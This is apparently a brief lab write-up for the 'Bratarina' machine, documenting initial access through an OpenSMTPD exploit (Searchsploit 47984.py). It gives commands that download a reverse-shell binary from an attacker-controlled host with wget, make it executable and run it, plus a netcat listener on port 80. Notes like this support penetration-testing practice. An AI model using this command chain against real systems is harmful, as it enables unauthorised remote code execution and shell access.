# üè¥ Bratarina (Linux)

## üß† Initial Foothold

- Found port 25 open running **OpenSMTPD**.

- Searched for vulnerabilities using Searchsploit and identified:
  - **Exploit:** `47984.py`

- Used the following commands to exploit the target:
  ```bash
  python3 47984.py 192.168.102.71 25 "wget 192.168.45.229/revshell.elf -O /tmp/revshell.elf"
  python3 47984.py 192.168.102.71 25 "chmod +x /tmp/revshell.elf"
  python3 47984.py 192.168.102.71 25 "/tmp/revshell.elf"
  ```

- ‚ö†Ô∏è Reverse shell must connect back on **port 80** (other ports may fail).

- Listener:
  ```bash
  nc -nlvp 80
  ```

- Successfully received a shell.
